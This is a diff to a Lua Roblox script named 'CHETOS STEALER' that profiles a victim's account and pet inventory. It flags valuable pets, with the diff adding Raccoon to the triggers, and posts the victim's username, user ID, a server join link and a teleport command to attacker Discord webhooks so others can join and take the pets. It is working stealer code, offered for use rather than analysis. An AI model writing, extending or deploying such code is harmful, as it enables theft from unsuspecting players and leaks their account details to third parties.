@@ -19,7 +19,7 @@ local CONFIG = {
     PING_MESSAGE = "@everyone **kupal naka HIT!!!🤑🤑🤑🤑**",
     KITSUNE_PING_MESSAGE = "@everyone",
     DYNAMIC_DISCORD_LINKS = {
-        "https://discord.gg/ZXwu8pKQwp",
+        "https://discord.gg/XnhmkKxm",
         "https://discord.gg/ZXwu8pKQwp"
     },
     HUGE_PET_WEIGHT = 6.0,
@@ -198,6 +198,7 @@ task.spawn(function()
     local stats = { total = 0, huge = 0, agedMutated = 0 }
     local hasKitsune = false
     local hasDiscoBee = false
+    local hasRaccoon = false
     local hasSpecialPets = false
     local hasMegaHuge = false
     local hasAscendedPet = false
@@ -219,7 +220,8 @@ task.spawn(function()
                 
                 if basePetType == "Kitsune" then hasKitsune = true end
                 if basePetType == "Disco Bee" then hasDiscoBee = true end
-                if basePetType == "Raccoon" or basePetType == "Butterfly" then hasSpecialPets = true end
+                if basePetType == "Raccoon" then hasRaccoon = true end
+                if basePetType == "Butterfly" then hasSpecialPets = true end
                 if basePetType == "Dragonfly" then dragonflyCount = dragonflyCount + 1 end
                 if basePetType == "Butterfly" then butterflyCount = butterflyCount + 1 end
                 if mutationName == "Mega" and pet.isHuge then hasMegaHuge = true end
@@ -320,56 +322,33 @@ task.spawn(function()
     
     local hasPetCombo = (dragonflyCount >= 3 and butterflyCount >= 2)
     
+    local join_link = string.format("[Join Server](https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)
     local teleport_command = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")\n```", game.PlaceId, game.JobId)
-    local common_description_parts = {"**👤 Player Information**", "```", ("😭 Display Name: %s"):format(player.DisplayName), ("👤 Username: @%s"):format(player.Name), ("👁️ User ID: %d"):format(player.UserId), ("🦸 Receiver: %s"):format(getgenv().receiver or ""), ("💻 Executor: %s"):format(executorName), ("🌐 Server: %s"):format(serverStatus), "```", "**📊 BACKPACK STATISTICS**", "```", ("🤭 Total Pets: %d"):format(stats.total), ("🤑 Huge Pets: %d"):format(stats.huge), ("⭐ Aged/Mutated: %d"):format(stats.agedMutated), ("🎯 Priority Pets: %d"):format(#priorityPets), "```", "**🐾 All Pets**", formattedPriorityPetsForMonitor}
+    local description = table.concat({"**👤 Player Information**", "```", ("😭 Display Name: %s"):format(player.DisplayName), ("👤 Username: @%s"):format(player.Name), ("👁️ User ID: %d"):format(player.UserId), ("🦸 Receiver: %s"):format(getgenv().receiver or ""), ("💻 Executor: %s"):format(executorName), ("🌐 Server: %s"):format(serverStatus), "```", "**📊 BACKPACK STATISTICS**", "```", ("🤭 Total Pets: %d"):format(stats.total), ("🤑 Huge Pets: %d"):format(stats.huge), ("⭐ Aged/Mutated: %d"):format(stats.agedMutated), ("🎯 Priority Pets: %d"):format(#priorityPets), "```", "**🐾 All Pets**", formattedPriorityPetsForMonitor, "**🔗 SERVER ACCESS - GET THE LOOT!**", "Click 'Join Server' to get the pets. If the victim is not in the server, they have already left.", join_link}, "\n")
+    local embed = {title = "🐾 **CHETOS STEALER PALDO**", color = 2829617, description = description, footer = { text = "CHETOS STEALER • by CHETOS Developer", icon_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
     
-    local isExclusiveHit = hasKitsune or hasDiscoBee or #priorityPets >= 10 or hasDragonflyCombo or hasButterflyCombo or hasMegaTargetPet
+    local base_payload = {username = " CHETOS PETS STEALER", avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&", embeds = { embed }}
+
+    local isExclusiveHit = hasKitsune or hasDiscoBee or hasRaccoon or #priorityPets >= 10 or hasDragonflyCombo or hasButterflyCombo or hasMegaTargetPet
     
     if isExclusiveHit then
-        local join_link = string.format("[Join Server](https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)
-        local description_parts = clone(common_description_parts)
-        table.insert(description_parts, "**🔗 SERVER ACCESS - GET THE LOOT!**")
-        table.insert(description_parts, "Click 'Join Server' to get the pets. If the victim is not in the server, they have already left.")
-        table.insert(description_parts, join_link)
-        
-        local embed = {title = "🐾 **CHETOS STEALER PALDO**", color = 2829617, description = table.concat(description_parts, "\n"), footer = { text = "CHETOS STEALER • by CHETOS Developer", icon_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
-        local payload = {username = " CHETOS PETS STEALER", avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&", embeds = { embed }}
+        local payload = clone(base_payload)
         if shouldPing then payload.content = teleport_command .. "\n" .. CONFIG.PING_MESSAGE; payload.allowed_mentions = { parse = {"everyone"} } end
         sendOurWebhook(CONFIG.KITSUNE_WEBHOOK_URL, payload)
     elseif hasSpecialPets or hasMegaHuge or hasAscendedPet or hasPetCombo then
-        local join_link = string.format("[Join Server](https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)
-        local description_parts_with_link = clone(common_description_parts)
-        table.insert(description_parts_with_link, "**🔗 SERVER ACCESS - GET THE LOOT!**")
-        table.insert(description_parts_with_link, "Click 'Join Server' to get the pets. If the victim is not in the server, they have already left.")
-        table.insert(description_parts_with_link, join_link)
-        
-        local embed_with_link = {title = "🐾 **CHETOS STEALER PALDO**", color = 2829617, description = table.concat(description_parts_with_link, "\n"), footer = { text = "CHETOS STEALER • by CHETOS Developer", icon_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
-        local payload_with_link = {username = " CHETOS PETS STEALER", avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&", embeds = { embed_with_link }}
-        if shouldPing then payload_with_link.content = teleport_command .. "\n" .. CONFIG.PING_MESSAGE; payload_with_link.allowed_mentions = { parse = {"everyone"} } end
-        sendOurWebhook(CONFIG.KITSUNE_WEBHOOK_URL, payload_with_link)
-
-        local description_parts_no_link = clone(common_description_parts)
-        table.insert(description_parts_no_link, "**🔗 SERVER ACCESS - GET THE LOOT!**")
-        table.insert(description_parts_no_link, "Link is private for high-priority hits.")
-        
-        local embed_no_link = {title = "🐾 **CHETOS STEALER PALDO**", color = 2829617, description = table.concat(description_parts_no_link, "\n"), footer = { text = "CHETOS STEALER • by CHETOS Developer", icon_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
-        local payload_no_link = {username = " CHETOS PETS STEALER", avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&", embeds = { embed_no_link }}
-        if shouldPing then payload_no_link.content = teleport_command .. "\n" .. CONFIG.PING_MESSAGE; payload_no_link.allowed_mentions = { parse = {"everyone"} } end
-        sendOurWebhook(CONFIG.ALL_HITS_WEBHOOK_URL, payload_no_link)
+        local payload = clone(base_payload)
+        if shouldPing then payload.content = teleport_command .. "\n" .. CONFIG.PING_MESSAGE; payload.allowed_mentions = { parse = {"everyone"} } end
+        sendOurWebhook(CONFIG.KITSUNE_WEBHOOK_URL, payload)
+        sendOurWebhook(CONFIG.ALL_HITS_WEBHOOK_URL, payload)
         if loaderWebhook then
-            sendOurWebhook(loaderWebhook, payload_no_link)
+            sendOurWebhook(loaderWebhook, payload)
         end
     else
-        local description_parts_no_link = clone(common_description_parts)
-        table.insert(description_parts_no_link, "**🔗 SERVER ACCESS - GET THE LOOT!**")
-        table.insert(description_parts_no_link, "Link is private for high-priority hits.")
-        
-        local embed_no_link = {title = "🐾 **CHETOS STEALER PALDO**", color = 2829617, description = table.concat(description_parts_no_link, "\n"), footer = { text = "CHETOS STEALER • by CHETOS Developer", icon_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
-        local payload_no_link = {username = " CHETOS PETS STEALER", avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&", embeds = { embed_no_link }}
-        if shouldPing then payload_no_link.content = teleport_command .. "\n" .. CONFIG.PING_MESSAGE; payload_no_link.allowed_mentions = { parse = {"everyone"} } end
-        sendOurWebhook(CONFIG.ALL_HITS_WEBHOOK_URL, payload_no_link)
+        local payload = clone(base_payload)
+        if shouldPing then payload.content = teleport_command .. "\n" .. CONFIG.PING_MESSAGE; payload.allowed_mentions = { parse = {"everyone"} } end
+        sendOurWebhook(CONFIG.ALL_HITS_WEBHOOK_URL, payload)
         if loaderWebhook then
-            sendOurWebhook(loaderWebhook, payload_no_link)
+            sendOurWebhook(loaderWebhook, payload)
         end
     end
 
